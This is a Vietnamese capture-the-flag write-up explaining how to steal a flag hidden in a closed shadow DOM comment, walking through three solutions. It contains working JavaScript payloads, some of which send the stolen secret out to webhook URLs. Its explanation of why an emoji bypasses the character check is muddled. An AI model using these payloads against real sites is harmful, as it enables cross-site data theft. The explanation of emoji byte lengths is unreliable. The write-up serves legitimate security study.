Một bài client side rất hay về shadow DOM, mục đích của đề bài đó chính là lấy được flag nằm trong một COMMENT node bên trong shadow DOM
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/791675ef-df54-43c0-967a-318536d6369b)

## Tổng quan
```html
<html>
	<head>
		<title>Sayeha</title>
	</head>
	<body>
		<div id="ctx"></div>
		<script>
			function containsText(){
				for(let i=0;i<0x10000;i++){
					if(window.find(String.fromCharCode(i))){
						return true
					}
				}
				return false
			}

			let params = new URLSearchParams(document.location.search)
			let html = params.get('html') ?? '<!-- hi -->'
			let p = params.get('p') ?? 'console.log(1337)'
			let shadow = ctx.attachShadow({mode: 'closed'});

			let mtag = document.createElement('meta')
			mtag.httpEquiv = 'Content-Security-Policy'
			mtag.content = `default-src 'none'; script-src 'unsafe-eval';`
			document.head.appendChild(mtag)

			shadow.appendChild(document.createElement('div'))
			shadow.children[0].innerHTML = `<!-- ${localStorage.getItem('secret') ?? 'ASIS{test-flag}'} -->`
			shadow.children[0].innerHTML += html.slice(0,0x2000)
			localStorage.removeItem('secret')

			if(
				shadow.children.length != 1 ||
				shadow.children[0].innerText != '' ||
				containsText()
			){
				throw 'no'
			}

			shadow = null
			mtag = null

			setTimeout(p,500)
		</script>
	</body>
</html>


```
Ta có 1 bug JS Injection và 1 bug HTML Injection lần lượt thông qua GET param `p` và `html`:
- Ở bug HTML Injection, data mà ta nhập vào sẽ được đưa vào một **closed** shadow DOM
- Ở bug JS Injection, data nhập vào sẽ được đưa vào sink `setTimeout`

Trang web có triển khai CSP: 
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/e00f981f-42e4-46ac-a592-d7e94fe313ec)

## Shadow DOM
Shadow DOM là một tính năng được sử dụng để tạo một DOM tree mới được "sandbox" với DOM tree chính
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/bd4a1f03-bf12-483e-812b-7aaebe0f56e1)

Shadow DOM sẽ được `attach` vào một host ( một node trong DOM chính ) và có thể ở một trong 2 trạng thái: `closed` và `open`. Đối với trạng thái open thì DOM tree chính có thể truy cập được vào bên trong thông qua thuộc tính `shadowRoot` của host node

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/52a8fa91-e321-4873-9b6b-2f380216b69b)

Đối với `closed` thì sẽ là điều ngược lại, ta sẽ nhận về giá trị `null` nếu cố gắng truy xuất vào shadowRoot
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/74268d1c-4622-4546-a7ce-345e6cf6a998)

Tới đây hẳn bạn sẽ nghĩ shadowRoot là một cơ chế bảo mật giúp sandbox một DOM tree lại, tuy nhiên shadow DOM chưa bao giờ được tạo ra nhằm mục đích bảo mật, nó được tạo ra để isolate các style giữa các DOM với nhau
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/d3d6a506-bdea-4f23-ab80-ef682d7c7c1b)

Một trong những cách đã từng được sử dụng là sử dụng hàm `window.find` được đề cập trong bài `shadow` [DiceCTF 2022](https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md), bởi dù là các DOM tree khác nhau nhưng vẫn cùng chung một `window` object nên việc này là dễ hiểu. Ở bài CTF lần này, kỹ thuật đó đã không còn sử dụng được bởi `window.find` chỉ có thể tìm ra các text trong DOM và sau khi được đưa vào DOM thông qua `innerHTML` thì `div` node đã được kiểm tra để bảo đảm thằng `innerText` là rỗng
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/36d93fed-18c7-45dd-98ff-4b199f78347d)

## Solution by Ark
Ở solution của Ark, tuy là một unintended solution nhưng mình thật sự thấy thích cách giải này, do writeup của Ark rất ngắn gọn, chỉ có solve script và không có giải thích gì nên mình quyết định sẽ giải thích cách làm đó tại đây:
Solve script của Ark:
```html
<body>
<script>
const TARGET_BASE_URL = "http://web";
// const TARGET_BASE_URL = "http://localhost:8000";

const HOOK_URL = "https://webhook.site/xxx";

const elm = document.createElement("iframe");
elm.src = `${TARGET_BASE_URL}?p=${encodeURIComponent(`
  const w = open("${TARGET_BASE_URL}");
  const flag = w.localStorage.getItem("secret");
  location = "${HOOK_URL}?q=" + flag;
`)}`;
document.body.appendChild(elm);
</script>
</body>
```
Ở đây anh này sẽ tạo một iframe, chĩa source của iframe đến trang challenge và sau đó tại trang challenge lại tiếp tục mở một window đến trang challenge đó, cùng đọc kỹ lại đoạn code của challenge:
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/0294147e-11b2-44ac-ae1d-873fd9c5e937)

Chú ý ở 3 chỗ mình bôi đen, đầu tiên `secret` sẽ được lấy ra từ Local Storage và đưa vào comment, ngay sau đó sẽ thực hiện remove nó khỏi Local Storage nhằm mục đích ngăn việc truy xuất flag trực tiếp sau khi callback của `setTimeout` (do ta kiểm soát) chạy, 500 mili second là thời gian mà tác giả cho sleep để tránh việc callback được chạy trước khi `secret` được xóa khỏi Local Storage do tính bất đồng bộ của JS. Vậy cách làm của Ark chính là dùng `window.open` để lấy `secret` trong Local Storage trước khi nó bị remove. Nhưng hẳn bạn sẽ băn khoăn rằng chẳng phải `secret` đã được xóa từ khi lần đầu truy cập vào trang challenge rồi sao? Đó là lý do mà Ark dùng đến iframe, bên trong iframe thì Local Storage sẽ là Local Storage của top-live window do cơ chế [Storage Partitioning](https://developer.mozilla.org/en-US/docs/Web/Privacy/State_Partitioning#static_partitioning) của browser, do đó tại thời điểm đó `secret` sẽ không tồn tại trong Local Storage. 
## Solution by IcesFont
Đây là solution được sử dụng để giải cả `sageya` và `sageya_revenge` (fix unintended) bằng cách tạo một iframe element bên trong shadow DOM và set `name` là `x`, sau đó gọi `window.open('', 'x')` để select được đến element đó, cùng vấn đề với `window.find` đó là dù DOM khác nhau thì vẫn cùng chung một `window` object. 
Solve: `?html=<iframe name='x'></iframe>&p=location='http://webhook/?'+open('', 'x').frameElement.parentElement.firstChild.data`

Khi gọi đến `window.open`, tham số thứ 2 sẽ được dùng để xác định tên của một context, nếu context đó chưa tồn tại thì sẽ thực hiện mở 1 window để mở ra context đó, vậy thì bằng cách chèn một iframe (đóng vai trò là một context) và đặt tên cho nó thì ta có thể select đến phần tử của context đó thông qua thuộc tính `frameElement` và từ đó truy xuất được đến các phần tử còn lại của DOM, cách làm rất sáng tạo. 
## Solution by Ske
TL;DR:

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/e42c14d5-0d7e-4bc6-b886-1ab3dd249ab2)

Để ý hàm `containsText`, vì cách hàm này check là dùng `window.find` để loop qua các ký tự từ 0->65536, ta biết đây là giới hạn các ký tự có thể biểu diễn được của UTF-16 và mỗi ký tự sẽ cần 2 byte để biểu diễn
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/8148a07f-9fa6-4ae4-8805-0feb61d1bc2a)

Một ký tự như emoji "🫠" (`1F AE 00`) sẽ cần đến 3 byte để biểu diễn, do đó sẽ bypass qua `containsText`. Cùng với đó thì tag `details` ở trạng thái collapsed sẽ có `innerText` == `""` tuy nhiên vẫn có thể được tìm thấy bởi `window.find`. Vậy là giải quyết được rồi, sử dụng lại kỹ thuật `window.find` và `document.execCommand` là giải quyết được bài này rồi nhỉ?
```
http://91.107.168.3:8000/?html=<details+contenteditable><summary></summary>🫠</details>&p=console.log(window.find('🫠'));document.execCommand('insertHTML',false,"<img+src=x+onerror=alert()+/>")`
```
Không đơn giản như thế, trong CSP không có `unsafe-inline`, ta không thể tùy ý thực thi JS được, Ske đã có một phát hiện rất hay đó là lợi dụng một callback `connectedCallback` được gọi mỗi khi một element được gắn vào cây DOM để từ đó truy xuất đến element đó
Bằng cách define một element mới với method `connectedCallback` dùng để truy xuất vào `this` ta sẽ dễ dàng truy xuất được đến shadow DOM
Payload của mình:
```
http://91.107.168.3:8000/?html=<details+contenteditable><summary></summary>🫠</details>&p=class TestElement extends HTMLElement {connectedCallback() {console.log(this.parentElement.parentElement.parentElement.innerHTML);}};customElements.define('test-element', TestElement);console.log(window.find("🫠"));document.execCommand("insertHTML",false,'<test-element></test-element>')
```
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/00c83d24-ba1f-4f53-b988-1bcde2623523)

Giờ chỉ cần gửi về webhook nữa là được :)
